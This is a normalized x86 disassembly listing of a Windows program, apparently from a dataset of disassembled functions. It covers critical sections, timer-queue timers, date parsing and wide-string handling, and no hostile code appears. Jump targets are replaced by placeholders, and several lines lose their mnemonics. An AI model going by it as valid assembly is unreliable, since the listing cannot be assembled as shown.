add edi [ esi + 0x10 ]
mov ebx edi
shr ebx 0x1
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x8 ]
add eax 0x2
shr eax 0x1
cmp ecx eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub ebx eax
push 0x1
mov ecx esi
call sub_411dd0
mov edx [ esi + 0x4 ]
mov eax [ edx + ebx * 4 ]
and edi 0x1
lea edi [ eax + edi * 8 ]
test edi edi
pop ebx
je r-xdata
push 0x10
call sub_42e3bc
mov ecx [ esi + 0x4 ]
add esp 0x4
mov [ ecx + ebx * 4 ] eax
mov eax [ esi + 0x10 ]
inc eax
pop edi
mov [ esi + 0x10 ] eax
pop esi
retn 0x4
mov eax [ esp + 0xc ]
mov ecx [ eax ]
mov [ edi ] ecx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
sub_411ff0
push 0xffffffff
push sub_430c58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_411d60
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_412030
push 0xffffffff
push sub_430c8e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esp + 0x8 ] ecx
mov [ esp + 0x14 ] al
call sub_411d60
mov [ esp + 0x14 ] 0xffffffff
mov [ esi + 0xc ] r--data
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov ecx [ esp + 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_412090
sub esp 0x8
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov [ esi ] 0x0
lea ebp [ esi + 0x10 ]
cmp edi 0x1
jne r-xdata
mov eax [ esi + 0x38 ]
test eax eax
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esi + 0x34 ]
mov eax ecx
shr eax 0x1
lea edx [ eax + eax ]
sub ecx edx
mov edx [ esi + 0x30 ]
cmp edx eax
ja r-xdata
mov edx [ esi + 0x2c ]
mov eax [ edx + eax * 4 ]
mov edi [ eax + ecx * 8 ]
mov ebx [ eax + ecx * 8 + 0x4 ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
sub eax edx
mov eax [ esi + 0x38 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x34 ]
mov edx [ esi + 0x30 ]
inc ecx
shl edx 0x1
cmp edx ecx
mov [ esi + 0x34 ] ecx
ja r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
push ebx
call edi
jmp r-xdata
mov eax [ esi + 0x4 ]
push eax
call [ ResetEvent@IAT ]
dec eax
mov [ esi + 0x38 ] eax
jne r-xdata
mov [ esi + 0x34 ] 0x0
push 0xffffffff
push 0x0
lea edx [ esp + 0x18 ]
push edx
push 0x2
call [ WaitForMultipleObjects@IAT ]
push ebp
mov edi eax
call [ EnterCriticalSection@IAT ]
test edi edi
jne r-xdata
mov [ esi + 0x34 ] 0x0
sub_412160
push 0xffffffff
push sub_430ca8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
xor ecx ecx
mov [ esp ] eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4121b0
push 0xffffffff
push sub_430cde
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
lea eax [ esi + 0x10 ]
push eax
mov [ esp + 0x8 ] esi
mov [ esi + 0xc ] r--data
call [ InitializeCriticalSection@IAT ]
xor ecx ecx
mov [ esp + 0x14 ] ecx
lea eax [ esi + 0x28 ]
mov [ esp + 0x8 ] eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_412220
push 0xffffffff
push sub_430cf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea edi [ eax + 0x4 ]
push edi
mov [ esp + 0xc ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x1c ] 0x0
cmp [ esi ] 0x0
jne r-xdata
mov [ esp + 0x1c ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x14 ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x8
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
lea edx [ esp + 0xc ]
mov [ esp + 0xc ] ecx
push edx
lea ecx [ esi + 0x28 ]
mov [ esp + 0x14 ] eax
call sub_411f70
mov eax [ esi + 0x4 ]
push eax
call [ SetEvent@IAT ]
sub_4122b0
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_430d1e
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
mov ecx rw-data
call sub_4121b0
push sub_433fa0
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_412320
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
push 0xffffffff
push eax
push 0x0
call [ DeleteTimerQueueTimer@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn
pop esi
retn
mov [ esi + 0x4 ] 0x0
sub_412370
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
mov [ esi ] r--data
je r-xdata
pop esi
retn
push 0xffffffff
push eax
push 0x0
call [ DeleteTimerQueueTimer@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
sub_4123b0
mov eax ecx
mov ecx [ esp + 0x4 ]
cmp eax ecx
je r-xdata
retn 0x4
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
sub_412470
sub esp 0x24
mov eax [ esp + 0x3c ]
mov edx [ esp + 0x34 ]
push esi
mov esi ecx
mov ecx [ esp + 0x3c ]
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x30 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x34 ]
dec ecx
mov [ esp + 0xc ] edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x44 ]
lea ecx [ esp + 0x4 ]
add edx 0xfffff894
push ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x28 ] eax
call [ _mktime64@IAT ]
mov [ esi + 0x4 ] edx
mov ecx [ esi + 0x4 ]
mov edx eax
and edx ecx
add esp 0x4
cmp edx 0xffffffff
mov [ esi ] eax
jne r-xdata
mov eax esi
pop esi
add esp 0x24
retn 0x1c
push 0x80070057
call sub_401d20
sub_412510
push ebx
mov ebx [ esp + 0x8 ]
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test ebx ebx
je r-xdata
pop ebx
retn 0x4
test eax eax
jne r-xdata
push esi
push edi
mov esi eax
mov ecx 0x9
mov edi ebx
[ edi ] [ esi ]
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x4
sub_4126d0
push ecx
push ebx
mov ebx [ ecx ]
sub ebx 0x10
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x8 ] ecx
mov ecx [ ebx ]
mov eax [ ecx ]
push esi
call [ eax + 0x10 ]
mov esi [ esp + 0x14 ]
mov edx [ eax ]
push 0x2
push esi
mov ecx eax
call [ edx ]
test eax eax
jne r-xdata
cmp ebp esi
jge r-xdata
call sub_4126c0
lea ecx [ esi + esi + 0x2 ]
mov edx ecx
push edi
shr ecx 0x2
lea edi [ eax + 0x10 ]
mov [ esp + 0x18 ] edi
lea esi [ ebx + 0x10 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ eax + 0x4 ] ebp
lea eax [ ebx + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
pop edi
jg r-xdata
mov esi ebp
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0xc ]
pop esi
pop ebp
mov [ ecx ] eax
pop ebx
pop ecx
retn 0x4
mov ecx [ ebx ]
mov edx [ ecx ]
push ebx
call [ edx + 0x4 ]
sub_412750
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov eax [ esi ]
mov ecx [ eax - 0x10 ]
mov edx [ ecx ]
sub eax 0x10
push 0x2
push edi
push eax
call [ edx + 0x8 ]
test eax eax
jne r-xdata
add eax 0x10
pop edi
mov [ esi ] eax
pop esi
retn 0x4
call sub_4126c0
sub_412780
sub esp 0x8
push esi
mov esi [ esp + 0x14 ]
mov cl [ esi + 0x4 ]
mov al 0x2d
cmp cl al
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0xffffffff
pop esi
add esp 0x8
retn
cmp [ esi + 0x7 ] al
jne r-xdata
mov cl [ esi + 0xd ]
mov al 0x3a
cmp cl al
jne r-xdata
cmp [ esi + 0x10 ] al
jne r-xdata
push ebx
push ebp
push edi
mov edi [ atoi@IAT ]
push esi
call edi
mov ebx eax
lea eax [ esi + 0x5 ]
push eax
call edi
lea ecx [ esi + 0x8 ]
push ecx
mov ebp eax
call edi
lea edx [ esi + 0xb ]
push edx
mov [ esp + 0x24 ] eax
call edi
mov [ esp + 0x20 ] eax
lea eax [ esi + 0xe ]
push eax
call edi
add esi 0x11
push esi
mov [ esp + 0x38 ] eax
call edi
add esp 0x18
cmp ebx 0x7b2
jge r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x10 ]
mov esi [ esp + 0x1c ]
push 0x0
push eax
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
push ebp
push ebx
mov ecx esi
call sub_412470
pop edi
pop ebp
pop ebx
mov eax esi
pop esi
add esp 0x8
retn
mov eax [ esp + 0x1c ]
pop edi
pop ebp
pop ebx
mov [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0xffffffff
pop esi
add esp 0x8
retn
sub_412860
mov edx [ ecx + 0x4 ]
test edx edx
lea eax [ ecx + 0x4 ]
je r-xdata
mov edx [ esp + 0xc ]
push edx
mov edx [ esp + 0x8 ]
push edx
mov edx [ esp + 0x10 ]
push edx
push ecx
push sub_412350
push 0x0
push eax
call [ CreateTimerQueueTimer@IAT ]
retn 0xc
mov eax 0x1
retn 0xc
sub_4128a0
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
test eax eax
lea esi [ edi + 0x4 ]
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0xffffffff
push eax
push 0x0
call [ DeleteTimerQueueTimer@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0x0
push edi
push sub_412350
push 0x0
push esi
call [ CreateTimerQueueTimer@IAT ]
pop edi
pop esi
retn 0x4
pop edi
mov eax 0x1
pop esi
retn 0x4
pop edi
xor eax eax
pop esi
retn 0x4
mov [ esi ] 0x0
sub_412900
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
mov [ esi ] r--data
je r-xdata
test [ esp + 0x8 ] 0x1
je r-xdata
push 0xffffffff
push eax
push 0x0
call [ DeleteTimerQueueTimer@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x4 ] 0x0
sub_412940
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0xc ] ecx
retn 0x8
sub_412980
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
retn 0x4
sub_4129b0
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov esi [ ecx + 0x4 ]
cmp esi eax
jg r-xdata
xor eax eax
pop esi
retn 0x4
jl r-xdata
cmp eax [ ecx + 0xc ]
jg r-xdata
mov esi [ ecx ]
cmp esi edx
ja r-xdata
jl r-xdata
mov eax 0x1
pop esi
retn 0x4
cmp edx [ ecx + 0x8 ]
ja r-xdata
sub_412a10
mov eax [ ecx ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
sub_412a30
mov eax [ ecx ]
mov edx [ esp + 0x4 ]
sub eax 0x10
push esi
mov esi [ eax + 0x4 ]
cmp esi edx
jle r-xdata
cmp [ eax + 0xc ] 0x1
pop esi
jle r-xdata
mov edx esi
mov eax [ eax + 0x8 ]
cmp eax edx
jge r-xdata
mov [ esp + 0x4 ] edx
jmp sub_4126d0
retn 0x4
cmp eax 0x400
jle r-xdata
add eax eax
add eax 0x400
jmp r-xdata
mov [ esp + 0x4 ] eax
jmp sub_412750
mov eax edx
cmp eax edx
jge r-xdata
sub_412a80
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi ]
mov eax [ ecx ]
call [ eax + 0x10 ]
mov edx [ esi + 0xc ]
test edx edx
lea ecx [ esi + 0xc ]
jl r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ eax ]
push 0x2
push ecx
mov ecx eax
call [ edx ]
test eax eax
jne r-xdata
cmp eax [ esi ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x4 ]
lea ecx [ ecx + ecx + 0x2 ]
mov edx ecx
push edi
shr ecx 0x2
add esi 0x10
lea edi [ eax + 0x10 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
jmp sub_4126c0
mov eax esi
mov edx 0x1
[ ecx ] edx
pop esi
retn
sub_412af0
push 0xffffffff
push sub_430d38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
push esi
mov esi ecx
mov ecx rw-data
mov [ esp + 0x4 ] esi
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_412b40
push 0xffffffff
push sub_430d58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
sub_412b90
mov eax [ esp + 0x4 ]
mov eax [ eax ]
push esi
sub eax 0x10
push eax
mov esi ecx
call sub_412a80
add eax 0x10
mov [ esi ] eax
add esp 0x4
mov eax esi
pop esi
retn 0x4
sub_412bb0
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax - 0x4 ]
sub eax 0x10
mov ecx 0x1
sub ecx edx
mov edx [ eax + 0x8 ]
mov eax [ esp + 0x8 ]
sub edx eax
or ecx edx
jge r-xdata
mov eax [ esi ]
pop esi
retn 0x4
push eax
mov ecx esi
call sub_412a30
sub_412be0
push 0xffffffff
push sub_430d78
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
mov eax [ eax ]
push esi
sub eax 0x10
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_412a80
add esp 0x4
add eax 0x10
mov [ esi ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_412c30
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax - 0x4 ]
sub eax 0x10
mov ecx 0x1
sub ecx edx
mov edx [ eax + 0x8 ]
mov eax [ esp + 0x8 ]
sub edx eax
or ecx edx
jge r-xdata
mov eax [ esi ]
pop esi
retn 0x4
push eax
mov ecx esi
call sub_412a30
sub_412c60
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push edi
mov edi ecx
jne r-xdata
push ebp
mov ebp [ esp + 0x14 ]
push esi
push ebp
push ebx
call [ _vscwprintf@IAT ]
mov esi eax
mov eax [ edi ]
mov edx [ eax - 0x4 ]
sub eax 0x10
mov ecx 0x1
sub ecx edx
mov edx [ eax + 0x8 ]
sub edx esi
add esp 0x8
or ecx edx
jge r-xdata
push 0x80070057
call sub_401d20
mov eax [ edi ]
push ebp
push ebx
push eax
call [ vswprintf@IAT ]
add esp 0xc
test esi esi
jl r-xdata
push esi
mov ecx edi
call sub_412a30
push 0x80070057
call sub_401d20
mov eax [ edi ]
cmp esi [ eax - 0x8 ]
jg r-xdata
mov [ eax - 0xc ] esi
mov ecx [ edi ]
mov [ ecx + esi * 2 ] 0x0
pop esi
pop ebp
pop edi
pop ebx
retn 0x8
sub_412d00
push 0xffffffff
push sub_430dc9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push ebp
push esi
xor esi esi
mov [ esp + 0x1c ] esi
mov eax [ rw-data ]
push edi
mov ecx rw-data
call [ eax + 0xc ]
add eax 0x10
mov [ esp + 0x1c ] eax
mov [ esp + 0x2c ] 0x2
mov edi [ esp + 0x38 ]
mov ebp [ _localtime64@IAT ]
push edi
call ebp
add esp 0x4
or ebx 0xffffffff
cmp eax esi
je r-xdata
mov [ esp + 0x10 ] ebx
mov ecx [ eax ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov [ esp + 0x14 ] ebx
mov edx [ eax + 0x4 ]
mov [ esp + 0x14 ] edx
jmp r-xdata
push edi
call ebp
add esp 0x4
cmp eax esi
je r-xdata
mov [ esp + 0x18 ] ebx
mov eax [ eax + 0x8 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
push edi
call ebp
add esp 0x4
cmp eax esi
je r-xdata
xor ebx ebx
mov ebx [ eax + 0xc ]
jmp r-xdata
push edi
call ebp
add esp 0x4
cmp eax esi
je r-xdata
push edi
call ebp
add esp 0x4
test eax eax
je r-xdata
mov esi [ eax + 0x10 ]
inc esi
push edi
call ebp
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
mov eax [ eax + 0x14 ]
add eax 0x76c
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
mov ecx [ esi ]
mov edx [ ecx ]
push esi
call [ edx + 0x4 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
push ecx
push ebx
push esi
push eax
lea edx [ esp + 0x34 ]
push r--data
push edx
call sub_412ce0
mov esi [ esp + 0x3c ]
add esi 0xfffffff0
push esi
call sub_412a80
mov edi [ esp + 0x58 ]
add eax 0x10
add esp 0x24
mov [ edi ] eax
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x2c ] 0x0
lea eax [ esi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
sub_412e40
push 0xffffffff
push sub_430df9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ esp + 0x20 ]
cdq
mov [ esp ] 0x0
push esi
mov esi [ esp + 0x20 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
push esi
mov [ esp + 0x14 ] edx
call sub_412d00
add esp 0x8
mov ecx [ esp + 0x10 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
sub_412ee0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
push ecx
call [ InitializeCriticalSection@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412f70
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov [ esi ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x14 ] edx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
add edi 0x34
push edi
lea ecx [ esi + 0x34 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
pop edi
mov eax esi
pop esi
retn 0x4
sub_413050
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
push edi
lea edi [ esi + 0x4 ]
je r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call [ Ordinal_ATL71_64@IAT ]
mov [ esi + 0xc ] 0x0
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4130a0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
push edi
lea edi [ esi + 0x4 ]
je r-xdata
pop edi
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call [ Ordinal_ATL71_64@IAT ]
mov [ esi + 0xc ] 0x0
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_413110
push 0xffffffff
push sub_430e18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esi + 0x4 ]
test eax eax
lea edi [ esi + 0x4 ]
je r-xdata
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call [ Ordinal_ATL71_64@IAT ]
mov [ esi + 0xc ] 0x0
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_413190
push 0xffffffff
push sub_430e38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_413110
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4131d0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov [ esi + 0x14 ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x18 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x24 ] ecx
mov edx [ edi + 0x14 ]
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x28 ] edx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
add edi 0x34
push edi
lea ecx [ esi + 0x48 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
pop edi
pop esi
retn 0x4
sub_413220
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov [ esi + 0x14 ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x18 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x24 ] ecx
mov edx [ edi + 0x14 ]
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x28 ] edx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
add edi 0x34
push edi
lea ecx [ esi + 0x48 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
pop edi
pop esi
retn 0x4
sub_413270
push 0xffffffff
push sub_430e58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov [ esp ] eax
mov [ eax ] r--data
mov [ esp + 0xc ] 0x0
mov ecx [ esp + 0x14 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4132f0
push 0xffffffff
push sub_430e78
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
mov [ ecx ] r--data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_413380
push 0xffffffff
push sub_430ea5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x18 ]
mov [ esi + 0x38 ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4133e0
push 0xffffffff
push sub_430ec5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x1c ]
push ecx
lea ecx [ esi + 0x1c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x1
mov edx [ esp + 0x20 ]
mov [ esi + 0x38 ] edx
mov [ esp + 0x10 ] 0xffffffff
